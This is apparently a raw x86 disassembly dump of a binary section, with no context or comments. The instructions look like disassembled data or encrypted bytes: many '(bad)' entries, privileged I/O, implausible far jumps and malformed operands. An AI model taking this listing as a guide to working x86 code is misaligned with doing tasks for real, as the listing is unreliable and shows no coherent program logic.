  408a0d:	add    al,0x52
  408a0f:	xor    eax,0x4a0b04eb
  408a14:	les    edi,FWORD PTR [edi]
  408a16:	and    BYTE PTR [edi+ebp*2],al
  408a19:	les    edi,FWORD PTR [edx+ebp*1+0xd]
  408a1d:	mov    ebx,0x445f1876
  408a22:	xchg   ebx,eax
  408a23:	ret    
  408a24:	xlat   BYTE PTR ds:[ebx]
  408a25:	fld    QWORD PTR [esp+eax*1]
  408a28:	add    bl,BYTE PTR [ebx+0x730b710b]
  408a2e:	inc    BYTE PTR [ecx-0x3]
  408a31:	push   ecx
  408a32:	ret    0x65af
  408a35:	push   ecx
  408a36:	mov    dl,ch
  408a38:	(bad)  
  408a39:	jecxz  0x408a04
  408a3b:	rol    DWORD PTR [eax],1
  408a3d:	mov    esi,0xbde59c6f
  408a42:	ror    DWORD PTR ds:0x4c6f4f12,1
  408a48:	xor    cl,BYTE PTR [eax-0x441864fb]
  408a4e:	fimul  DWORD PTR [esi+ebp*8]
  408a51:	test   al,0x35
  408a53:	cmp    al,0xc7
  408a55:	dec    edi
  408a56:	dec    esp
  408a57:	sbb    eax,0xbef35244
  408a5c:	and    al,0x74
  408a5e:	in     al,0x27
  408a60:	mov    ebp,0x2b18c90b
  408a65:	sub    BYTE PTR [esi+ecx*1+0x48e8230f],0x58
  408a6d:	or     DWORD PTR [eax],0xaabe6335
  408a73:	outs   dx,BYTE PTR ds:[esi]
  408a74:	or     edi,edx
  408a76:	mov    esp,0xd9d8bae1
  408a7b:	and    DWORD PTR [esi+0x6c],ecx
  408a7e:	lock loop 0x408a2c
  408a81:	das    
  408a82:	out    0xe9,al
  408a84:	popf   
  408a85:	stos   BYTE PTR es:[edi],al
  408a86:	xor    eax,0xfd9112d3
  408a8b:	sti    
  408a8c:	into   
  408a8d:	adc    al,0x99
  408a8f:	and    al,0x9a
  408a91:	ins    BYTE PTR es:[edi],dx
  408a92:	pop    eax
  408a93:	dec    ebx
  408a94:	test   eax,0x58c4f5c9
  408a99:	or     edx,DWORD PTR [edi-0x55]
  408a9c:	stos   DWORD PTR es:[edi],eax
  408a9d:	std    
  408a9e:	push   edi
  408a9f:	imul   eax,DWORD PTR [edx+ebx*1+0x17],0xffffffb6
  408aa4:	and    ah,BYTE PTR [ebx+0x52]
  408aa7:	adc    al,0xc5
  408aa9:	repnz outs dx,BYTE PTR fs:[esi]
  408aac:	das    
  408aad:	lods   al,BYTE PTR ds:[esi]
  408aae:	stos   BYTE PTR es:[edi],al
  408aaf:	jecxz  0x408a7c
  408ab1:	mov    WORD PTR [edx],ds
  408ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ab4:	cmp    bh,ah
  408ab6:	jg     0x408af3
  408ab8:	and    cx,cx
  408abb:	cs leave 
  408abd:	popa   
  408abe:	inc    ebx
  408abf:	push   edx
  408ac0:	adc    DWORD PTR [edx-0x334fd3d5],ebp
  408ac6:	cs mov ch,0x15
  408ac9:	or     BYTE PTR [esi+0x738cc7c2],ch
  408acf:	sub    dl,ah
  408ad1:	das    
  408ad2:	mov    al,ds:0x7dd356d2
  408ad7:	xor    al,dh
  408ad9:	and    DWORD PTR [esi],edi
  408adb:	sti    
  408adc:	xchg   BYTE PTR [edi],dl
  408ade:	xor    eax,esp
  408ae0:	loope  0x408b4b
  408ae2:	and    al,0x71
  408ae4:	iret   
  408ae5:	and    edx,DWORD PTR [esi-0x3429598a]
  408aeb:	xchg   ebp,eax
  408aec:	in     eax,dx
  408aed:	jmp    0xe:0x745bb3ad
  408af4:	push   eax
  408af5:	inc    edx
  408af6:	pusha  
  408af7:	in     al,dx
  408af8:	int3   
  408af9:	scas   al,BYTE PTR es:[edi]
  408afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408afb:	jmp    0xe797fde7
  408b00:	mov    ch,0x80
  408b02:	jp     0x408b49
  408b04:	or     BYTE PTR fs:0x52b4a2e9,ch
  408b0b:	push   ecx
  408b0c:	ret    
  408b0d:	daa    
  408b0e:	xchg   ebp,eax
  408b0f:	mov    bh,0x5
  408b11:	enter  0x790d,0x56
  408b15:	inc    edx
  408b16:	pop    ds
  408b17:	or     DWORD PTR [eax-0x6f813589],ebp
  408b1d:	jns    0x408ae1
  408b1f:	xlat   BYTE PTR ds:[ebx]
  408b20:	mov    edi,0x902928a3
  408b25:	lds    eax,FWORD PTR [esi+0x61b2d0de]
  408b2b:	push   ss
  408b2c:	mov    dl,0xb3
  408b2e:	mov    dh,0x2d
  408b30:	bts    DWORD PTR [esi-0x5a],0x20
  408b35:	ror    DWORD PTR [ecx-0x7a],0x4
  408b39:	jg     0x408b3f
  408b3b:	lods   al,BYTE PTR ds:[esi]
  408b3c:	out    dx,eax
  408b3d:	loop   0x408b64
  408b3f:	xchg   edi,eax
  408b40:	push   esi
  408b41:	test   BYTE PTR [ecx],ah
  408b43:	xor    ch,BYTE PTR [ebx+0x30151e8f]
  408b49:	out    0x73,eax
  408b4b:	fisub  DWORD PTR [ebp*8+0x4a149f92]
  408b52:	mov    edx,DWORD PTR [edx-0x48]
  408b55:	sbb    eax,0x570e861b
  408b5a:	aas    
  408b5b:	mov    ah,BYTE PTR [ebp+0x52]
  408b5e:	push   ss
  408b5f:	xchg   ebp,eax
  408b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b61:	inc    eax
  408b62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b63:	(bad)  
  408b64:	scas   al,BYTE PTR es:[edi]
  408b65:	xor    BYTE PTR [eax+0x2acb0688],ch
  408b6b:	jne    0x408b10
  408b6d:	jb     0x408b8a
  408b6f:	(bad)  
  408b70:	stos   BYTE PTR es:[edi],al
  408b71:	and    BYTE PTR [edx-0x65],dh
  408b74:	repz mov cl,BYTE PTR [ebp-0x3c40f2bd]
  408b7b:	pop    ds
  408b7c:	mov    fs,WORD PTR [ebp-0x32]
  408b7f:	sahf   
  408b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b81:	add    al,0x98
  408b83:	pushf  
  408b84:	int    0x5f
  408b86:	test   DWORD PTR [edi-0x18],eax
  408b89:	jbe    0x408bb1
  408b8b:	icebp  
  408b8c:	out    0xc4,eax
  408b8e:	fisttp DWORD PTR [ebx+0x7372123f]
  408b94:	xor    cl,BYTE PTR [ecx]
  408b96:	scas   al,BYTE PTR es:[edi]
  408b97:	mov    ebx,?
  408b99:	xchg   ebx,eax
  408b9a:	dec    edi
  408b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b9c:	clc    
  408b9d:	(bad)  
  408b9e:	push   0x147e418c
  408ba3:	and    BYTE PTR [eax+esi*4+0x2a],ah
  408ba7:	xchg   bh,al
  408ba9:	cs ret 0x1159
  408bad:	test   BYTE PTR [ebx],cl
  408baf:	cli    
  408bb0:	cmp    al,0xc9
  408bb2:	sti    
  408bb3:	out    dx,eax
  408bb4:	out    0x90,eax
  408bb6:	mov    ch,0x4
  408bb8:	aas    
  408bb9:	rcr    BYTE PTR [edi],0xfb
  408bbc:	imul   ebx,ecx,0x25
  408bbf:	hlt    
  408bc0:	dec    edi
  408bc1:	imul   esp,DWORD PTR [esi-0x65],0xffffff9c
  408bc5:	fwait
  408bc6:	popf   
  408bc7:	scas   eax,DWORD PTR es:[edi]
  408bc8:	lock int 0x98
  408bcb:	and    edx,DWORD PTR gs:0x96597f56
  408bd2:	xchg   ecx,eax
  408bd3:	popa   
  408bd4:	out    dx,eax
  408bd5:	push   es
  408bd6:	jge    0x408bdb
  408bd8:	imul   BYTE PTR [edx-0x3607c6c7]
  408bde:	(bad)  
  408bdf:	cmp    bl,ch
  408be1:	push   edx
  408be2:	sahf   
  408be3:	add    eax,0xdf9955a7
  408be8:	jne    0x408bdd
  408bea:	push   cs
  408beb:	sbb    eax,0xdb058b3f
  408bf0:	sub    bl,BYTE PTR [ebx+0x4efc3988]
  408bf6:	jmp    0xfca8:0x5c0bb966
  408bfd:	cwde   
  408bfe:	out    0xfe,eax
  408c00:	inc    edi
  408c01:	lds    esi,FWORD PTR [edx]
  408c03:	fld    QWORD PTR [esi+0x51]
  408c06:	(bad)  
  408c07:	pop    ss
  408c08:	arpl   ax,bx
  408c0a:	jle    0x408c0a
  408c0c:	xchg   edx,eax
  408c0d:	ret    
  408c0e:	pop    esi
  408c0f:	inc    esi
  408c10:	sbb    eax,0xb10da73d
  408c15:	sub    BYTE PTR [ecx+ebx*2],bh
  408c18:	pop    ds
  408c19:	mov    esi,0x45c29cf5
  408c1e:	test   BYTE PTR [eax-0xf],bl
  408c21:	jns    0x408c3c
  408c23:	loope  0x408c5e
  408c25:	xchg   esi,eax
  408c26:	rcl    DWORD PTR [esi],cl
  408c28:	pushf  
  408c29:	bound  edi,QWORD PTR [ebx+ecx*2-0xc039334]
  408c30:	cmp    DWORD PTR [esi+0x77a68145],ebx
  408c36:	rcr    BYTE PTR [eax+0x4a2628e7],cl
  408c3c:	lods   eax,DWORD PTR ds:[esi]
  408c3d:	push   0x7a
  408c3f:	jecxz  0x408c5a
  408c41:	outs   dx,DWORD PTR ds:[esi]
  408c42:	mov    dl,0xb1
  408c44:	test   eax,0x6261f2c5
  408c49:	mov    esp,0xe69beaa5
  408c4f:	das    
  408c50:	xchg   ebx,eax
  408c51:	mov    bl,0x1f
  408c53:	nop
  408c54:	lea    edx,[eax]
  408c56:	sbb    DWORD PTR [ecx-0x58],ebp
  408c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c5a:	aas    
  408c5b:	out    0xfa,al
  408c5d:	icebp  
  408c5e:	cmc    
  408c5f:	jne    0x408c12
  408c61:	jle    0x408c4b
  408c63:	mov    ebx,0x43283cdc
  408c68:	push   ebp
  408c69:	dec    edi
  408c6a:	dec    ecx
  408c6b:	enter  0x9804,0xf8
  408c6f:	sub    eax,0xeda54554
  408c74:	xchg   esi,eax
  408c75:	pop    ebx
  408c76:	mov    ch,0x15
  408c78:	shl    BYTE PTR [eax-0x42ca1e4a],cl
  408c7e:	mov    bl,0xf7
  408c80:	adc    eax,0xf4d3b658
  408c85:	mov    ah,0xb0
  408c87:	mov    ch,0xc6
  408c89:	out    dx,eax
  408c8a:	inc    ecx
  408c8b:	xor    eax,0xc3b2dd56
  408c90:	(bad)  
  408c91:	loop   0x408d09
  408c93:	dec    BYTE PTR [esi]
  408c95:	retf   0xb710
  408c98:	dec    eax
  408c99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c9a:	add    eax,0xa0b3cc36
  408c9f:	mov    eax,ds:0xf0380e97
  408ca4:	int3   
  408ca5:	xchg   BYTE PTR [edx+0x50],ch
  408ca8:	mov    ah,0xb7
  408caa:	adc    DWORD PTR [esi+0x8f009cf],edi
  408cb0:	xchg   DWORD PTR [edi+eiz*8],eax
  408cb3:	push   ss
  408cb4:	adc    DWORD PTR [edx+0x786a4809],edi
  408cba:	hlt    
  408cbb:	adc    DWORD PTR [ebx+0x42d283cd],ebx
  408cc1:	mov    al,0x23
  408cc3:	test   esi,0x3f3cc42a
  408cc9:	(bad)  
  408ccb:	xchg   esi,eax
  408ccc:	xchg   esi,eax
  408ccd:	add    esp,DWORD PTR [edx]
  408ccf:	pop    edi
  408cd0:	mov    cl,0x64
  408cd2:	(bad)  
  408cd3:	idiv   dh
  408cd5:	daa    
  408cd6:	adc    BYTE PTR [ebp+0x49c7e50b],0x18
  408cdd:	push   es
  408cde:	jnp    0x408cef
  408ce0:	iret   
  408ce1:	retf   0x9792
  408ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ce5:	adc    bl,dl
  408ce7:	std    
  408ce8:	ins    DWORD PTR es:[edi],dx
  408ce9:	push   0xffffffd2
  408ceb:	ret    
  408cec:	mov    gs,WORD PTR [edx+0x679c0e37]
  408cf2:	mov    eax,0xf1daa808
  408cf7:	inc    esp
  408cf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cfa:	xchg   BYTE PTR [edx-0x65],dh
  408cfd:	(bad)  
  408cfe:	push   DWORD PTR [esi]
  408d00:	xchg   esp,eax
  408d01:	pushf  
  408d02:	xchg   ecx,eax
  408d03:	or     DWORD PTR [ebp+0xc],esi
  408d06:	inc    eax
  408d07:	fstp   TBYTE PTR [eax]
  408d09:	push   edx
  408d0a:	pop    esp
  408d0b:	in     eax,0x1f
  408d0d:	sub    dh,ch
  408d0f:	cmp    DWORD PTR [ebx-0x3b],ebp
  408d12:	push   0xffffffac
  408d14:	mov    ebp,0xe532c665
  408d19:	test   DWORD PTR [edi],esp
  408d1b:	pop    ecx
  408d1c:	mov    eax,0x4b79029f
  408d21:	or     DWORD PTR [esi],esp
  408d23:	push   ss
  408d24:	jnp    0x408d97
  408d26:	and    al,0xb2
  408d28:	adc    ebp,ebp
  408d2a:	mov    ecx,0x56498d42
  408d2f:	cmovp  edx,esp
  408d32:	jo     0x408ce1
  408d34:	xor    eax,0x256d3dfb
  408d39:	test   al,0x13
  408d3b:	in     al,0xda
  408d3d:	pop    edi
  408d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d40:	dec    eax
  408d41:	psrad  mm5,mm3
  408d44:	das    
  408d45:	in     al,0xe8
  408d47:	cld    
  408d48:	inc    bh
  408d4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d4b:	and    DWORD PTR [esi],ebp
  408d4d:	sub    edx,DWORD PTR ss:[edi+0x7c7f54c4]
  408d54:	add    eax,0x18658d0e
  408d59:	add    eax,0x3b092409
  408d5e:	int3   
  408d5f:	dec    ecx
  408d60:	hlt    
  408d61:	inc    ebp
  408d62:	cmp    eax,0xec9e85f0
  408d67:	nop
  408d68:	inc    esp
  408d69:	mov    edi,0x2b2eeb1a
  408d6e:	push   ss
  408d6f:	inc    eax
  408d70:	ins    DWORD PTR es:[edi],dx
  408d71:	xchg   esp,eax
  408d72:	ret    0xe85b
  408d75:	mov    edi,0xdd0e40e0
  408d7a:	pop    DWORD PTR [eax]
  408d7c:	nop
  408d7d:	outs   dx,DWORD PTR ds:[esi]
  408d7e:	cmc    
  408d7f:	add    esi,edi
  408d81:	mov    BYTE PTR [ebp+edx*2+0x50a543e6],al
  408d88:	sub    ch,BYTE PTR [ecx-0x56]
  408d8b:	les    si,DWORD PTR [esi+0x1f]
  408d8f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d91:	dec    ebx
  408d92:	xor    dl,BYTE PTR [edx-0x6c]
  408d95:	ds jge 0x408d3a
  408d98:	cmp    dh,cl
  408d9a:	data16 (bad) 
  408d9c:	jbe    0x408e0f
  408d9e:	add    al,0x81
  408da0:	and    ebx,DWORD PTR [edx+eax*1]
  408da3:	sbb    BYTE PTR [esp+eiz*2-0x5c],dh
  408da7:	je     0x408d5a
  408da9:	mov    bl,0xb2
  408dab:	mov    DWORD PTR ds:0x8c9268d3,ebx
  408db1:	xor    DWORD PTR [eax+edx*2],edx
  408db4:	dec    eax
  408db5:	push   ebp
  408db6:	inc    esi
  408db7:	fnsave [ebp+edi*8+0x12]
  408dbb:	inc    edx
  408dbc:	imul   edi,DWORD PTR [eax-0x33a4356e],0x4cdc1b
  408dc6:	sbb    edx,DWORD PTR [edx-0x15915794]
  408dcc:	mov    ds:0xc5ad1deb,eax
  408dd1:	inc    esi
  408dd2:	push   esi
  408dd3:	test   eax,0xe4539cd3
  408dd8:	mov    eax,ds:0xfb50d495
  408ddd:	not    DWORD PTR [ebp+0x23ee6802]
  408de3:	dec    ecx
  408de4:	into   
  408de5:	and    eax,0x3c4cb44f
  408dea:	pop    ebx
  408deb:	dec    eax
  408dec:	jo     0x408e30
  408dee:	pop    ss
  408def:	add    al,0x31
  408df1:	inc    ebx
  408df2:	mov    edx,0x1bf01610
  408df7:	pushf  
  408df8:	out    dx,eax
  408df9:	pop    ds
  408dfa:	or     al,0xef
  408dfc:	fcomp  st(7)
  408dfe:	mov    edx,0x423cdc3f
  408e03:	sets   dh
  408e06:	adc    ah,al
  408e08:	xchg   DWORD PTR [ecx+0x5fd8ca4a],ecx
  408e0e:	loop   0x408e38
  408e10:	les    esi,FWORD PTR [edx+0x48]
  408e13:	sar    BYTE PTR [edx-0x32],cl
  408e16:	ret    
  408e17:	mov    al,BYTE PTR [esi]
  408e19:	and    edi,DWORD PTR [ecx+0x62bc40d5]
  408e1f:	xchg   esi,eax
  408e20:	jecxz  0x408e60
  408e22:	and    DWORD PTR [eax+esi*1],ecx
  408e25:	xor    DWORD PTR [ebp-0x790a9cdd],0xffffff97
  408e2c:	popa   
  408e2d:	mov    WORD PTR [edi],ss
  408e2f:	pop    esi
  408e30:	adc    BYTE PTR [ecx+0x43e9f52b],0x35
  408e37:	pop    ecx
  408e38:	adc    BYTE PTR [ebp+0x110d5a27],ah
  408e3e:	adc    eax,0xf62d761c
  408e43:	dec    BYTE PTR [edx-0x50407f30]
  408e49:	mov    al,0x0
  408e4b:	in     al,0x12
  408e4d:	push   ss
  408e4e:	rcl    DWORD PTR [edi],cl
  408e50:	mov    ebp,DWORD PTR [ebx+0x18]
  408e53:	mov    bh,0xd2
  408e55:	mov    ah,0x6
  408e57:	lahf   
  408e58:	je     0x408e65
  408e5a:	or     ah,0x70
  408e5d:	fmul   DWORD PTR [eax-0x79]
  408e60:	outs   dx,BYTE PTR ds:[esi]
  408e61:	(bad)  [ebp-0x6f]
  408e64:	xchg   edx,eax
  408e65:	punpckhdq mm4,QWORD PTR [edi+0xf939ce9]
  408e6c:	jo     0x408ead
  408e6e:	sub    bl,BYTE PTR [esi+ecx*2-0x1f]
  408e72:	push   eax
  408e73:	inc    ebp
  408e74:	mov    al,0x5
  408e76:	sbb    dl,bh
  408e78:	rol    BYTE PTR [eax],1
  408e7a:	sahf   
  408e7b:	xor    ebp,esi
  408e7d:	into   
  408e7e:	cmp    edi,DWORD PTR [ebp-0x16]
  408e81:	mov    ds,WORD PTR [edx+0x3555fce8]
  408e87:	and    al,0x5a
  408e89:	xchg   DWORD PTR [ebp-0x41c53440],esi
  408e8f:	jl     0x408f0e
  408e91:	dec    edi
  408e92:	sbb    ch,BYTE PTR [eax+edi*8]
  408e95:	xlat   BYTE PTR ds:[ebx]
  408e96:	daa    
  408e97:	jp     0x408f06
  408e99:	scas   al,BYTE PTR es:[edi]
  408e9a:	inc    esi
  408e9b:	add    esi,eax
  408e9d:	push   es
  408e9e:	cwde   
  408e9f:	push   eax
  408ea0:	lahf   
  408ea1:	xchg   ebx,eax
  408ea2:	xlat   BYTE PTR ds:[ebx]
  408ea3:	out    dx,al
  408ea4:	cmp    eax,DWORD PTR [ebx-0x3c1ad97d]
  408eaa:	adc    eax,0xf95e916f
  408eaf:	hlt    
  408eb0:	clc    
  408eb1:	inc    eax
  408eb2:	pop    edx
  408eb3:	pop    ds
  408eb4:	retf   0x2fd6
  408eb7:	mov    ecx,DWORD PTR [ecx-0x38d4eada]
  408ebd:	and    BYTE PTR [edx+edx*2],dh
  408ec0:	cmc    
  408ec1:	mov    eax,0x57b00431
  408ec6:	jae    0x408f32
  408ec8:	xlat   BYTE PTR ds:[ebx]
  408ec9:	add    BYTE PTR ds:0x5f29cba6,dl
  408ecf:	pop    eax
  408ed0:	and    eax,0xb3e992c0
  408ed5:	dec    esi
  408ed6:	inc    esp
  408ed7:	out    0x89,al
  408ed9:	sahf   
  408eda:	retf   0x70be
  408edd:	sub    eax,0xa27783dd
  408ee2:	pop    esi
  408ee3:	lods   al,BYTE PTR ds:[esi]
  408ee4:	fbstp  TBYTE PTR [eax]
  408ee6:	ins    DWORD PTR es:[edi],dx
  408ee7:	sub    eax,0x2c2448c
  408eec:	shl    BYTE PTR [edx+0x38],0xea
  408ef0:	push   0x53
  408ef2:	pop    es
  408ef3:	add    eax,0x8d340ef2
  408ef8:	inc    ebp
  408ef9:	dec    ecx
  408efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408efb:	loop   0x408f0a
  408efd:	aad    0x4a
  408eff:	mov    edi,0x6e44f5f
  408f04:	pop    edx
  408f05:	(bad)  [eax-0x6ff88f29]
  408f0b:	dec    esi
  408f0c:	sub    BYTE PTR [edx-0x26],dh
  408f0f:	pop    ss
  408f10:	add    BYTE PTR [ebx+0x42],bh
  408f13:	retf   
  408f14:	and    al,0xa1
  408f16:	sbb    eax,ecx
  408f18:	sub    DWORD PTR [ebx+0xd],ecx
  408f1b:	mov    ch,0xe9
  408f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f1e:	dec    esp
  408f1f:	js     0x408ed9
  408f21:	call   0x5512:0x34d9aadb
  408f28:	in     al,dx
  408f29:	aaa    
  408f2a:	inc    eax
  408f2b:	mov    ah,0xd8
  408f2d:	ret    0x42e3
  408f30:	mov    dl,0x83
  408f32:	inc    edi
  408f33:	inc    ebx
  408f34:	mov    edi,0x5def2738
  408f39:	or     BYTE PTR [eax],bh
  408f3b:	push   edx
  408f3c:	test   DWORD PTR [edi],ecx
  408f3e:	cmp    ebx,ecx
  408f40:	test   DWORD PTR [edi+edx*1-0x22960a86],edi
  408f47:	and    al,0x50
  408f49:	mov    esp,0x6e975bc1
  408f4e:	pop    esp
  408f4f:	leave  
  408f50:	cdq    
  408f51:	aad    0x80
  408f53:	and    DWORD PTR ds:0x955ebd71,esi
  408f59:	lds    esi,FWORD PTR [ebp+0x7b13bf89]
  408f5f:	sub    esp,edi
  408f61:	andps  xmm6,XMMWORD PTR [ebx+0x24b47345]
  408f68:	ja     0x408f97
  408f6a:	pop    esi
  408f6b:	add    eax,0x4717c34a
  408f70:	in     eax,0x1d
  408f72:	jb     0x408f41
  408f74:	push   ss
  408f75:	mov    ebx,0x8b532ab6
  408f7a:	mov    eax,0x28b3c48b
  408f7f:	out    0x35,al
  408f81:	fidiv  WORD PTR [eax+0x53c801c9]
  408f87:	lds    edi,FWORD PTR [ebp+0x338ee923]
  408f8d:	add    eax,0xd8415d10
  408f92:	mov    bl,0xd8
  408f94:	leave  
  408f95:	pop    ds
  408f96:	retf   0xde91
  408f99:	adc    eax,0xfb735d75
  408f9e:	jg     0x408f94
  408fa0:	(bad)  
  408fa1:	sbb    DWORD PTR [edi+0xd5cd46f],ebx
  408fa7:	in     eax,dx
  408fa8:	int    0x6a
  408faa:	sti    
  408fab:	xlat   BYTE PTR ds:[ebx]
  408fac:	pusha  
  408fad:	iret   
  408fae:	jle    0x408f96
  408fb0:	xchg   BYTE PTR [edi],dh
  408fb2:	pop    ds
  408fb3:	imul   esi,DWORD PTR [edx],0xffffff96
  408fb6:	pop    es
  408fb7:	test   al,0xae
  408fb9:	xchg   ebp,eax
  408fba:	cwde   
  408fbb:	push   eax
  408fbc:	dec    ebp
  408fbd:	xchg   edx,eax
  408fbe:	scas   eax,DWORD PTR es:[edi]
  408fbf:	test   BYTE PTR [esi+0x5f187806],al
  408fc5:	xchg   ecx,eax
  408fc6:	push   es
  408fc7:	pop    ds
  408fc8:	sub    DWORD PTR [esi],esp
  408fca:	popf   
  408fcb:	ficom  DWORD PTR [ebp-0xda5c252]
  408fd1:	inc    edx
  408fd2:	cwde   
  408fd3:	popa   
  408fd4:	xor    ecx,DWORD PTR ds:0x144c3f56
  408fda:	inc    esi
  408fdb:	cmp    ebx,DWORD PTR [edx+0x45]
  408fde:	test   eax,0x9d4a8341
  408fe3:	mov    al,0x6f
  408fe5:	jo     0x408f6a
  408fe7:	push   ebx
  408fe8:	inc    esi
  408fe9:	or     bl,bh
  408feb:	lahf   
  408fec:	jo     0x409000
  408fee:	sahf   
  408fef:	out    dx,eax
  408ff0:	popa   
  408ff1:	dec    eax
  408ff2:	out    dx,eax
  408ff3:	sub    DWORD PTR [eax],esi
  408ff5:	rcl    bh,0xfa
  408ff8:	jb     0x409030
  408ffa:	xchg   ebp,eax
  408ffb:	call   0x8438:0xe39da103
  409002:	test   DWORD PTR [ebp-0x50],esp
  409005:	fstp   QWORD PTR [eax+ebp*1+0x6ca50214]
  40900c:	sbb    ebx,DWORD PTR [edx+edx*4]
  40900f:	les    edx,FWORD PTR [eax+0x5a]
  409012:	xor    BYTE PTR [eax+0x662d1c0d],bl
  409018:	add    BYTE PTR [eax],dh
  40901a:	ret    0x8fb4
  40901d:	rcl    ah,cl
  40901f:	jo     0x409091
  409021:	cmc    
  409022:	and    DWORD PTR ds:0xfb5bd4,ecx
  409028:	(bad)
  40902b:	sub    BYTE PTR [ecx],dl
  40902d:	sbb    ebp,ecx
  40902f:	mov    ecx,0x7c30ce
  409034:	xchg   edx,eax
  409035:	outs   dx,DWORD PTR ds:[esi]
  409036:	pop    edi
  409037:	cmp    bl,BYTE PTR [ebp-0xdd378ca]
  40903d:	retf   
  40903e:	xchg   edx,eax
  40903f:	popf   
  409040:	inc    ebp
  409041:	lds    esi,FWORD PTR [edi-0x68]
  409044:	fcom   DWORD PTR [esi-0x53c66ead]
  40904a:	jno    0x40904e
  40904c:	int3   
  40904d:	es xchg BYTE PTR gs:[ecx+0x3b],bl
  409052:	lock push ebx
  409054:	adc    BYTE PTR [eax+0x61a5a886],cl
  40905a:	dec    esp
  40905b:	push   0x575fa268
  409060:	push   es
  409061:	lds    edx,FWORD PTR [ebp-0x4]
  409064:	mov    DWORD PTR [eax+0x2],ebx
  409067:	jmp    0x6c4550ef
  40906c:	mov    esp,0x967d9651
  409071:	dec    edi
  409072:	(bad)  
  409073:	je     0x40900d
  409075:	inc    ebp
  409076:	sbb    eax,0x579d7401
  40907b:	out    dx,eax
  40907c:	mov    cl,0x81
  40907e:	or     bh,ch
  409080:	call   0xd341:0x3362d4d5
  409087:	push   es
  409088:	push   edx
  409089:	adc    eax,0xca8d71f7
  40908e:	ss fwait
  409090:	rol    DWORD PTR [ecx],cl
  409092:	adc    bh,dh
  409094:	lds    edx,FWORD PTR [esp+ebp*1-0x31]
  409098:	xchg   esp,eax
  409099:	dec    edx
  40909a:	push   edx
  40909b:	xchg   esi,eax
  40909c:	cmp    BYTE PTR [ecx+0xd14201a],0x67
  4090a3:	test   BYTE PTR [ebx],ah
  4090a5:	sbb    eax,0x39e24fe
  4090aa:	push   ebp
  4090ab:	mov    ebp,DWORD PTR [ebx+0x6]
  4090ae:	push   ss
  4090af:	pop    eax
  4090b0:	in     al,dx
  4090b1:	and    eax,0xcc758af9
  4090b6:	cld    
  4090b7:	pusha  
  4090b8:	xor    DWORD PTR [ecx],ebx
  4090ba:	jg     0x4090af
  4090bc:	sti    
  4090bd:	jle    0x409113
  4090bf:	test   BYTE PTR [esp+eiz*2+0x13],bl
  4090c3:	out    dx,al
  4090c4:	paddw  mm2,QWORD PTR [ecx-0x404b1f5f]
  4090cb:	inc    edx
  4090cc:	mov    eax,ds:0x9008278a
  4090d1:	mov    al,0x17
  4090d3:	das    
  4090d4:	ins    DWORD PTR es:[edi],dx
  4090d5:	sahf   
  4090d6:	jns    0x409090
  4090d8:	retf   
  4090d9:	cmp    eax,0x93db4acd
  4090de:	xor    eax,0x10622720
  4090e3:	mov    eax,0x25392902
  4090e8:	or     dh,BYTE PTR [edi]
  4090ea:	cmc    
  4090eb:	dec    eax
  4090ec:	fsub   DWORD PTR [ebp+0x78109e07]
  4090f2:	and    esp,0xb6aa7cfa
  4090f8:	inc    esi
  4090f9:	push   eax
  4090fa:	daa    
  4090fb:	xchg   edx,eax
  4090fc:	jl     0x409159
  4090fe:	pop    eax
  4090ff:	jl     0x409136
  409101:	fild   QWORD PTR [ecx-0x7aa654f8]
  409107:	mov    al,0xf7
  409109:	inc    edx
  40910a:	mov    WORD PTR ds:0x150b4980,?
  409110:	adc    DWORD PTR [eax+0x20],0x4e
  409114:	add    ebx,DWORD PTR [ebx+0x7fa4a610]
  40911a:	inc    ecx
  40911b:	(bad)  
  40911c:	mov    eax,ds:0x76a9ce67
  409121:	fwait
  409122:	push   ecx
  409123:	in     al,dx
  409124:	adc    DWORD PTR [edi-0x73],esi
  409127:	jmp    0xe1fd0ba6
  40912c:	(bad)  
  40912d:	iret   
  40912e:	pop    ebx
  40912f:	and    DWORD PTR [edx-0x5a1fe2c0],0x311ec6f5
  409139:	jl     0x409170
  40913b:	jne    0x409188
  40913d:	int3   
  40913e:	clc    
  40913f:	call   0xaa0b:0x555166a4
  409146:	std    
  409147:	in     eax,0xe8
  409149:	xchg   ch,cl
  40914b:	nop
  40914c:	pop    ebp
  40914d:	push   esp
  40914e:	jp     0x4091a1
  409150:	add    BYTE PTR [edx-0x6c9c6e43],dl
  409156:	leave  
  409157:	push   ebp
  409158:	mov    eax,ebp
  40915a:	sub    ah,BYTE PTR [edx-0x57bd03b2]
  409160:	xor    eax,DWORD PTR [edx+0x7d]
  409163:	inc    ecx
  409164:	aas    
  409165:	lods   eax,DWORD PTR ds:[esi]
  409166:	cdq    
  409167:	push   ss
  409168:	jl     0x4091ba
  40916a:	lods   eax,DWORD PTR ds:[esi]
  40916b:	outs   dx,BYTE PTR ds:[esi]
  40916c:	shr    DWORD PTR [ecx],0xde
  40916f:	add    al,0xe9
  409171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409172:	xchg   DWORD PTR [ebx-0x50],ebp
  409175:	call   0x9f83c0e5
  40917a:	loopne 0x40918d
  40917c:	cdq    
  40917d:	inc    esp
  40917e:	inc    ecx
  40917f:	sbb    bl,dh
  409181:	push   esi
  409182:	jle    0x409118
  409184:	jecxz  0x4091f9
  409186:	push   ecx
  409187:	push   ebx
  409188:	test   BYTE PTR ds:[esi+0x1c],bh
  40918c:	test   eax,0x58ec5b41
  409191:	cli    
